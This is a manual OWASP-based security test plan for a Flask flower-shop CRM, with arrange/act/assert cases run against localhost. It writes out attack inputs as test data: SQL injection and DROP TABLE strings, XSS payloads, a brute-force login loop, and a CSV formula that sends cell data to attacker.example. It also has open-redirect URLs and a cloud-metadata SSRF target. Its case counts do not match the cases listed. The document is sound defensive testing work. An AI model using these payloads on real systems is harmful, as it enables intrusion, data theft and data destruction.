# Security Test Cases — CRM Kvitkova Povnya
# OWASP Top 10 Coverage

**Project:** CRM Kvitkova Povnya (Flask)
**Date:** 2026-03-23
**Tester:** _______________
**Environment:** http://localhost:5055 (local) / http://localhost:8002 (Docker)

---

## Legend

| Priority | Meaning |
|----------|---------|
| P0 | Blocker — exploitable in production, fix before deploy |
| P1 | Critical — significant risk, fix in current sprint |
| P2 | High — notable risk, fix in next sprint |
| P3 | Medium — low-risk weakness, schedule |
| P4 | Low — informational / hardening |

**Status values:** `PASS` / `FAIL` / `SKIP` / `BLOCKED`

---

## A01 — Broken Access Control

### TC-SEC-001 — Unauthenticated access to /clients/* (global guard + missing @login_required)

**OWASP:** A01:2021
**Priority:** P3 (defense-in-depth)
**Context:** The global `before_request` in `app/__init__.py:80-85` redirects all unauthenticated requests to `/login` — so these endpoints ARE protected in practice. However, `blueprints/clients/routes.py` has **no `@login_required` decorator** on any route. This is a defense-in-depth gap: if the global guard is ever modified, all client endpoints become instantly open.

**Arrange:**
- Clear browser cookies / use incognito or `curl` without `-L` (no redirect follow)

**Act:**
```bash
# Without following redirects — verify the guard fires
curl -v http://localhost:5055/clients 2>&1 | grep "< HTTP\|Location:"
curl -v -X POST http://localhost:5055/clients/new \
  -d "instagram=test&phone=0991234567" 2>&1 | grep "< HTTP\|Location:"
curl -v http://localhost:5055/clients/json 2>&1 | grep "< HTTP\|Location:"
curl -v -X POST http://localhost:5055/clients/1/delete 2>&1 | grep "< HTTP\|Location:"
```

**Assert:**
- Expected: HTTP 302 to `/login` on all requests above (global guard works)
- Secondary check: `@login_required` decorator is missing from all client routes — **confirm as code smell**, file as P3 hardening ticket even if runtime behavior is correct
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

**Note if PASS:** Open hardening ticket — add `@login_required` to each client route as defense-in-depth. The single global guard is a single point of failure.

---

### TC-SEC-002 — Unauthenticated access to /settings dictionary endpoints (global guard + missing @login_required)

**OWASP:** A01:2021
**Priority:** P3 (defense-in-depth)
**Context:** Same situation as TC-SEC-001. `blueprints/settings/routes.py` — `get_cities`, `add_city`, `get_delivery_types`, `add_delivery_type`, `get_sizes`, `add_size`, `get_for_whom`, `add_for_whom`, `get_marketing_sources`, `add_marketing_source`, `get_prices`, `save_prices` — all lack `@login_required`. Global `before_request` currently protects them.

**Act:**
```bash
curl -v http://localhost:5055/settings/cities 2>&1 | grep "< HTTP\|Location:"
curl -v -X POST http://localhost:5055/settings/cities \
  -H "Content-Type: application/json" \
  -d '{"value": "TestCity"}' 2>&1 | grep "< HTTP\|Location:"
curl -v http://localhost:5055/settings/prices 2>&1 | grep "< HTTP\|Location:"
```

**Assert:**
- Expected: HTTP 302 to `/login` on all (global guard works)
- Secondary check: missing decorators — file hardening ticket
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-008 — Florist role bypass via direct URL access

**OWASP:** A01:2021
**Priority:** P1
**Risk:** Florist user can access order/client data by directly navigating to protected URLs; the restriction in `app/__init__.py:87` only redirects, there is no hard HTTP 403

**Arrange:**
- Log in as a user with `user_type = 'florist'`

**Act:**
1. Navigate to `GET /orders`
2. Navigate to `GET /clients`
3. Navigate to `GET /reports`

**Assert:**
- Expected: HTTP 403 Forbidden OR redirect to `/florist` on each attempt
- Actual: _______________

**Note:** Current code only issues a redirect; a quick client-side trick (e.g., intercepting redirect) would not expose data here, but the pattern should be a hard server block.

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-009 — Manager cannot access /settings (permission_required)

**OWASP:** A01:2021
**Priority:** P2

**Arrange:**
- Log in as user with role `manager` (no `admin` role)

**Act:**
1. `GET /settings`
2. `POST /settings/update`

**Assert:**
- Expected: HTTP 403 on both
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-010 — IDOR on certificate detail endpoint

**OWASP:** A01:2021
**Priority:** P2
**Risk:** Authenticated user can enumerate all certificate IDs to read financial data

**Arrange:**
- Log in as any authenticated user
- Know or guess a certificate ID belonging to another context

**Act:**
```bash
# Sequentially probe IDs
for i in 1 2 3 4 5; do
  curl -b session.cookie http://localhost:5055/certificates/$i/detail
done
```

**Assert:**
- Expected: All accessible (IDOR is acceptable if all authenticated users are trusted equals); document the result
- Note: If any role-based restriction on certificates is intended, verify it's enforced

**Status:** [ ] PASS  [ ] SKIP (document intent)

---

## A02 — Cryptographic Failures

### TC-SEC-011 — Hardcoded SECRET_KEY fallback in production

**OWASP:** A02:2021
**Priority:** P0
**Risk:** Sessions can be forged if `SECRET_KEY` env var is absent; attacker with knowledge of `'your-secret-key-here'` can sign arbitrary session cookies

**Arrange:**
- Inspect `app/config.py:7`
- Start app **without** `SECRET_KEY` env variable set

**Act:**
```python
# Check which key is active:
import os; print(repr(os.environ.get('SECRET_KEY')))
```

**Assert:**
- Expected: App refuses to start if `SECRET_KEY` is not set (raises `RuntimeError`)
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-012 — Hardcoded DB credentials in config fallback

**OWASP:** A02:2021
**Priority:** P1
**Risk:** `kvitkova_user:kvitkova_password` hardcoded as fallback in `config.py:34` — trivially discoverable from source code

**Arrange:**
- Review `app/config.py:8,34`
- Attempt DB connection using fallback credentials from a network peer

**Act:**
```bash
psql -h localhost -U kvitkova_user -d kvitkova_crm
# Password: kvitkova_password
```

**Assert:**
- Expected: Connection fails (credentials not in use in any real environment)
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-013 — Weak Telegram webhook secret fallback

**OWASP:** A02:2021
**Priority:** P2
**Risk:** `TELEGRAM_WEBHOOK_SECRET = 'webhook_secret'` default allows spoofing Telegram webhook callbacks

**Arrange:**
- Check `app/config.py:41`
- Identify webhook endpoint in telegram_bot module

**Act:**
- Send a POST to the webhook endpoint with `X-Telegram-Bot-Api-Secret-Token: webhook_secret`

**Assert:**
- Expected: Request rejected if env var is not explicitly set
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-014 — Password hashing algorithm strength

**OWASP:** A02:2021
**Priority:** P3

**Arrange:**
- Create a test user with a known password
- Inspect `password_hash` column in DB

**Act:**
```sql
SELECT password_hash FROM "user" WHERE username = 'testuser';
```

**Assert:**
- Expected: Hash starts with `scrypt:` or `pbkdf2:sha256:` (Werkzeug defaults — acceptable)
- Unexpected: MD5 / SHA1 / plaintext
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-015 — Session cookie security flags

**OWASP:** A02:2021
**Priority:** P2

**Arrange:**
- Log in successfully

**Act:**
- Inspect `Set-Cookie` response header for the session cookie

**Assert:**
- Expected: `HttpOnly` flag present
- Expected: `SameSite=Lax` or `Strict` flag present
- Expected: `Secure` flag present in production (HTTPS)
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## A03 — Injection

### TC-SEC-016 — SQL Injection on /orders search parameter

**OWASP:** A03:2021
**Priority:** P1

**Arrange:**
- Log in as admin/manager

**Act:**
```
GET /orders?q=' OR '1'='1
GET /orders?q=1; DROP TABLE "order";--
```

**Assert:**
- Expected: Normal empty results or search results, no DB error, no data from unrelated tables
- Unexpected: HTTP 500 with SQL error in response body, or all records returned on the `' OR '1'='1` payload
- Actual: _______________

**Note:** SQLAlchemy ORM with parameterized queries should prevent this; confirm no raw `text()` calls in `order_service.py`.

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-017 — XSS via client Instagram field (stored)

**OWASP:** A03:2021
**Priority:** P1
**Risk:** Stored XSS — attacker creates client with script in Instagram handle; payload executes for all users viewing client list

**Arrange:**
- Log in as admin/manager

**Act:**
1. Create client with `instagram = <script>alert('XSS-TC017')</script>`
2. Navigate to `GET /clients`
3. Open any order/delivery that references this client

**Assert:**
- Expected: Script tag rendered as escaped text, no alert dialog appears
- Unexpected: Alert dialog fires
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-018 — XSS via certificate comment field (stored)

**OWASP:** A03:2021
**Priority:** P1

**Arrange:**
- Log in as admin/manager

**Act:**
1. `POST /certificates/create` with body:
   ```json
   {"type":"amount","code":"XSSTEST","value_amount":100,
    "comment":"<img src=x onerror=alert('XSS-TC018')>"}
   ```
2. Navigate to `GET /certificates`

**Assert:**
- Expected: Comment rendered as escaped text
- Unexpected: `onerror` handler fires
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-019 — XSS via order address field

**OWASP:** A03:2021
**Priority:** P1

**Arrange:**
- Log in as admin/manager

**Act:**
1. Create order with `address = <svg onload=alert('XSS-TC019')>`
2. View order list and route generator

**Assert:**
- Expected: Payload rendered escaped
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-020 — CSV injection via import file

**OWASP:** A03:2021
**Priority:** P2
**Risk:** Spreadsheet formula injection — if exported data is opened in Excel, formulas execute

**Arrange:**
- Log in as admin/manager
- Prepare CSV file with cell value: `=HYPERLINK("http://attacker.example/steal?d="&A1,"Click")`

**Act:**
1. Upload CSV to `POST /import/preview`
2. Execute import via `POST /import/execute`
3. Export any resulting data to CSV and open in spreadsheet

**Assert:**
- Expected: Values stored with leading `'` or sanitized, formula does not execute
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-021 — File upload MIME type bypass on CSV import

**OWASP:** A03:2021
**Priority:** P2
**Risk:** `import_csv/routes.py:20` only checks `file.filename.endswith('.csv')` — can be bypassed by renaming a malicious file to `.csv`

**Arrange:**
- Log in as admin/manager
- Create an HTML file containing `<script>alert(1)</script>`, rename it to `payload.csv`

**Act:**
```bash
curl -X POST http://localhost:5055/import/preview \
  -F "file=@payload.csv;type=text/html"
```

**Assert:**
- Expected: File rejected due to invalid content / MIME type validation
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## A04 — Insecure Design

### TC-SEC-022 — Brute force on /login (no rate limiting)

**OWASP:** A04:2021
**Priority:** P0
**Risk:** No rate limiting or account lockout on `POST /login` allows unlimited password attempts

**Arrange:**
- Identify a valid username (e.g., `admin`)
- Prepare list of common passwords

**Act:**
```bash
# 50 rapid login attempts
for i in $(seq 1 50); do
  curl -s -X POST http://localhost:5055/login \
    -d "username=admin&password=password$i" -c /dev/null | grep -c "Невірний"
done
```

**Assert:**
- Expected: After N failed attempts (e.g., 5), account locked or IP throttled (HTTP 429)
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-023 — CSRF protection absent on state-changing endpoints

**OWASP:** A04:2021
**Priority:** P1
**Risk:** Flask-WTF/CSRF is not configured; `conftest.py` explicitly disables CSRF; cross-site requests can perform actions on behalf of authenticated users

**Arrange:**
- Log in as admin in browser Tab A
- Host attacker HTML page in Tab B (or use `curl` with stolen session cookie)

**Act:**
1. From a different origin, POST to `http://localhost:5055/clients/new` with form fields
2. From a different origin, POST to `http://localhost:5055/clients/1/delete`

**Assert:**
- Expected: Request rejected with HTTP 400 (CSRF token mismatch)
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-024 — No account lockout after failed logins

**OWASP:** A04:2021
**Priority:** P1

**Arrange:**
- Known valid username

**Act:**
1. Submit 10 incorrect passwords for the account
2. Submit correct password on attempt 11

**Assert:**
- Expected: Account locked after threshold, correct password still fails until unlocked
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## A05 — Security Misconfiguration

### TC-SEC-025 — DEBUG=True active in DevelopmentConfig

**OWASP:** A05:2021
**Priority:** P1
**Risk:** Flask debug mode exposes interactive debugger, full stack traces with local variable values, and PIN-protected remote code execution in the Werkzeug debugger

**Arrange:**
- Start app with `python run.py` (uses `DevelopmentConfig`)

**Act:**
1. Trigger a Python exception (e.g., `GET /orders?page=abc` if unhandled)
2. Observe HTTP response

**Assert:**
- Expected in production config: Generic 500 error page, no stack trace
- Actual: _______________
- Verify `ProductionConfig` has `DEBUG = False` (it inherits from `DevelopmentConfig(DEBUG=True)` which it overrides)

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-026 — Verbose error messages in JSON responses

**OWASP:** A05:2021
**Priority:** P3

**Arrange:**
- Log in

**Act:**
1. Send malformed requests to AJAX endpoints (invalid JSON, missing required fields)
2. Inspect response bodies

**Assert:**
- Expected: Generic `{"success": false, "error": "..."}` without Python tracebacks or SQL details
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-027 — Changelog endpoint exposes file system path / version info

**OWASP:** A05:2021
**Priority:** P4

**Arrange:**
- No authentication required (`auth.changelog` is in public_endpoints)

**Act:**
```bash
curl http://localhost:5055/changelog
```

**Assert:**
- Expected: Safe to expose changelog; verify it contains no internal infrastructure details (IPs, credentials, internal paths)
- Actual: _______________

**Status:** [ ] PASS  [ ] SKIP

---

### TC-SEC-028 — Route optimizer external IP hardcoded in config

**OWASP:** A05:2021
**Priority:** P3
**Risk:** `ROUTE_OPTIMIZER_URL = 'http://34.55.114.149:3000'` hardcoded in `config.py:21,43` — changes require code deploy, not config change

**Arrange:**
- Review `app/config.py:21` and `DevelopmentConfig:43`

**Act:**
- Verify the URL is overridable via `ROUTE_OPTIMIZER_URL` env var

**Assert:**
- Expected: Env var takes precedence, hardcoded IP only used as last-resort default
- Additional concern: HTTP (not HTTPS) — data in transit unencrypted
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## A07 — Identification and Authentication Failures

### TC-SEC-029 — Open redirect via ?next= parameter

**OWASP:** A07:2021
**Priority:** P2
**Risk:** `auth/routes.py:24` checks `next_page.startswith('/')` — does not block protocol-relative URLs like `//evil.com` or URL-encoded variants

**Arrange:**
- Log out

**Act:**
```
GET /login?next=//attacker.example.com
GET /login?next=%2F%2Fattacker.example.com
GET /login?next=/\attacker.example.com
```
- Log in successfully on each URL

**Assert:**
- Expected: Redirect goes to safe internal page, not to external domain
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-030 — Session not invalidated after logout

**OWASP:** A07:2021
**Priority:** P2

**Arrange:**
- Log in, copy the `session` cookie value

**Act:**
1. Log out via `GET /logout`
2. Manually set cookie back to the copied value
3. Access `GET /orders`

**Assert:**
- Expected: HTTP 302 redirect to `/login` (old session token rejected)
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-031 — Inactive user can still log in

**OWASP:** A07:2021
**Priority:** P1
**Risk:** `User.is_active` field exists but `auth/routes.py:17-19` only checks `user.check_password()`, not `user.is_active`

**Arrange:**
- Create a test user, then set `is_active = False` in DB:
  ```sql
  UPDATE "user" SET is_active = false WHERE username = 'testuser';
  ```

**Act:**
- Attempt login with correct credentials for the deactivated user

**Assert:**
- Expected: Login rejected with "account disabled" message
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-032 — No multi-factor authentication

**OWASP:** A07:2021
**Priority:** P4
**Risk:** CRM contains PII and financial data; single-factor auth is the only protection

**Arrange:**
- Review login flow

**Assert:**
- Expected (hardening): MFA option available for admin accounts
- Current state: Document as accepted risk or roadmap item
- Actual: _______________

**Status:** [ ] SKIP (document risk acceptance)

---

## A08 — Software and Data Integrity Failures

### TC-SEC-033 — CSV import processes untrusted data without content validation

**OWASP:** A08:2021
**Priority:** P2

**Arrange:**
- Log in as admin/manager
- Prepare a CSV with extremely large field values (>10,000 chars per cell)
- Prepare a CSV with 10,000 rows

**Act:**
1. Upload to `POST /import/preview`
2. Upload to `POST /import/execute`

**Assert:**
- Expected: Request rejected or truncated at reasonable limits; no timeout/crash
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-034 — Certificate code collision / prediction

**OWASP:** A08:2021
**Priority:** P3
**Risk:** `generate_certificate_code` in `certificate.py` may be predictable; `generate_code` endpoint is `@login_required` but any authenticated user can pre-generate valid codes

**Arrange:**
- Log in
- Call `GET /certificates/generate-code?type=amount` 20 times

**Act:**
- Observe codes returned — check for sequential or easily guessable pattern

**Assert:**
- Expected: Codes have sufficient entropy (random component), not strictly sequential
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## A09 — Security Logging and Monitoring Failures

### TC-SEC-035 — Failed login attempts not logged

**OWASP:** A09:2021
**Priority:** P2

**Arrange:**
- Check application logs output / log configuration

**Act:**
1. Submit 5 failed login attempts
2. Inspect logs

**Assert:**
- Expected: Each failed attempt logged with timestamp, username attempted, and source IP
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-036 — Sensitive data operations not audit-logged

**OWASP:** A09:2021
**Priority:** P3
**Risk:** Client deletion, certificate creation, price changes leave no audit trail

**Arrange:**
- Log in as admin

**Act:**
1. Delete a client (`POST /clients/<id>/delete`)
2. Create a certificate (`POST /certificates/create`)
3. Modify prices (`POST /settings/prices`)
4. Inspect application logs

**Assert:**
- Expected: Each action logged with `user_id`, `action`, `timestamp`, affected record ID
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-037 — Successful logins not logged

**OWASP:** A09:2021
**Priority:** P3

**Arrange:**
- Monitor log output

**Act:**
- Log in successfully

**Assert:**
- Expected: Log entry: `INFO auth: user 'admin' logged in from IP x.x.x.x`
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## A10 — Server-Side Request Forgery (SSRF)

### TC-SEC-038 — SSRF via route optimizer URL manipulation

**OWASP:** A10:2021
**Priority:** P2
**Risk:** `ROUTE_OPTIMIZER_URL` is used to make outbound HTTP requests (`routes/routes.py`, `order_service.py`). If this URL can be influenced by user input or env var injection, internal services may be reachable.

**Arrange:**
- Log in as admin

**Act:**
1. Set `ROUTE_OPTIMIZER_URL=http://169.254.169.254/latest/meta-data/` (AWS metadata)
2. Trigger route optimization (any route that calls `submit_csv_job` or `optimize_json`)
3. Observe response / application behavior

**Assert:**
- Expected: URL is fixed in config, cannot be overridden per-request; internal metadata not returned
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-039 — SSRF via Telegram sendMessage target

**OWASP:** A10:2021
**Priority:** P3

**Arrange:**
- Inspect `routes/routes.py:15-27` (`_telegram_send` function)
- The `url` is constructed from a hardcoded Telegram API domain — verify no user-supplied input reaches it

**Act:**
- Review code: does any user-controlled value affect the `url` or `chat_id` in a way that routes to internal services?

**Assert:**
- Expected: `chat_id` is only the courier's Telegram ID from DB, not user-supplied in the request
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

## Additional / Cross-Cutting

### TC-SEC-040 — HTTP security headers presence

**OWASP:** A05:2021 (Defense in Depth)
**Priority:** P3

**Arrange:**
- Log in

**Act:**
```bash
curl -I http://localhost:5055/orders
```

**Assert:**
- Expected headers present:
  - [ ] `X-Content-Type-Options: nosniff`
  - [ ] `X-Frame-Options: DENY` or `SAMEORIGIN`
  - [ ] `Content-Security-Policy` (at minimum `default-src 'self'`)
  - [ ] `Referrer-Policy`
- Actual: _______________

**Status:** [ ] PASS  [ ] FAIL

---

### TC-SEC-041 — Sensitive data in URL parameters (order search)

**OWASP:** A02:2021
**Priority:** P3
**Risk:** Phone numbers and Instagram handles appear in query string (`/orders?phone=...`), logged in server access logs and browser history

**Act:**
- Search for a client by phone at `GET /orders?phone=0991234567`
- Check server access log

**Assert:**
- Expected: Phone/Instagram search uses POST body or is acceptable by design (document risk)
- Actual: _______________

**Status:** [ ] PASS  [ ] SKIP (document intent)

---

## Execution Tracking

| TC ID | Title (short) | Priority | Status | Tester | Date | Bug ID |
|-------|--------------|----------|--------|--------|------|--------|
| TC-SEC-001 | /clients/* missing @login_required (global guard works) | P3 | | | | |
| TC-SEC-002 | /settings/* missing @login_required (global guard works) | P3 | | | | |
| TC-SEC-008 | Florist role bypass | P1 | | | | |
| TC-SEC-009 | Manager /settings block | P2 | | | | |
| TC-SEC-010 | IDOR certificates | P2 | | | | |
| TC-SEC-011 | Hardcoded SECRET_KEY | P0 | | | | |
| TC-SEC-012 | Hardcoded DB credentials | P1 | | | | |
| TC-SEC-013 | Weak webhook secret | P2 | | | | |
| TC-SEC-014 | Password hashing algo | P3 | | | | |
| TC-SEC-015 | Session cookie flags | P2 | | | | |
| TC-SEC-016 | SQLi on /orders?q= | P1 | | | | |
| TC-SEC-017 | Stored XSS instagram | P1 | | | | |
| TC-SEC-018 | Stored XSS cert comment | P1 | | | | |
| TC-SEC-019 | Stored XSS order address | P1 | | | | |
| TC-SEC-020 | CSV formula injection | P2 | | | | |
| TC-SEC-021 | File upload MIME bypass | P2 | | | | |
| TC-SEC-022 | Brute force /login | P0 | | | | |
| TC-SEC-023 | CSRF absent | P1 | | | | |
| TC-SEC-024 | No account lockout | P1 | | | | |
| TC-SEC-025 | DEBUG=True in config | P1 | | | | |
| TC-SEC-026 | Verbose error messages | P3 | | | | |
| TC-SEC-027 | Changelog exposure | P4 | | | | |
| TC-SEC-028 | Hardcoded optimizer IP | P3 | | | | |
| TC-SEC-029 | Open redirect ?next= | P2 | | | | |
| TC-SEC-030 | Session not invalidated | P2 | | | | |
| TC-SEC-031 | Inactive user login | P1 | | | | |
| TC-SEC-032 | No MFA | P4 | | | | |
| TC-SEC-033 | CSV large payload DoS | P2 | | | | |
| TC-SEC-034 | Certificate code predict | P3 | | | | |
| TC-SEC-035 | Failed logins unlogged | P2 | | | | |
| TC-SEC-036 | Sensitive ops unlogged | P3 | | | | |
| TC-SEC-037 | Successful login unlogged | P3 | | | | |
| TC-SEC-038 | SSRF route optimizer | P2 | | | | |
| TC-SEC-039 | SSRF Telegram target | P3 | | | | |
| TC-SEC-040 | HTTP security headers | P3 | | | | |
| TC-SEC-041 | PII in URL params | P3 | | | | |

---

## OWASP Coverage Summary

| OWASP Category | TCs | Coverage |
|----------------|-----|---------|
| A01 Broken Access Control | TC-SEC-001 to 010 | 10 cases |
| A02 Cryptographic Failures | TC-SEC-011 to 015 | 5 cases |
| A03 Injection | TC-SEC-016 to 021 | 6 cases |
| A04 Insecure Design | TC-SEC-022 to 024 | 3 cases |
| A05 Security Misconfiguration | TC-SEC-025 to 028, 040 | 5 cases |
| A07 Auth Failures | TC-SEC-029 to 032 | 4 cases |
| A08 Data Integrity | TC-SEC-033 to 034 | 2 cases |
| A09 Logging & Monitoring | TC-SEC-035 to 037 | 3 cases |
| A10 SSRF | TC-SEC-038 to 039, 041 | 3 cases |
| **Total** | | **41 test cases** |

**Target:** 90% OWASP coverage (9/10 categories tested). A06 (Vulnerable Components) excluded — requires dependency audit tooling (`pip audit`, `safety`), not manual test cases.
